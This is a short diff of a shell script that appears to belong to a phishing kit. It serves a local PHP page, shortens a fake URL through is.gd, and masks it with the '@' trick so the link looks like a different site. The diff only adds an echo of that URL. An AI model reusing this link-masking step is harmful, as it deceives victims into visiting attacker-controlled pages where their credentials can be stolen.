@@ -113,6 +113,7 @@ make_php "$msk"
 php -S "$host":"$port" > /dev/null 2>&1 &
 ini_cloud
 cd "$loc"
+echo "$fkurl"
 req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
 is_gd=${req#https://}
 new_url=$msk@$is_gd
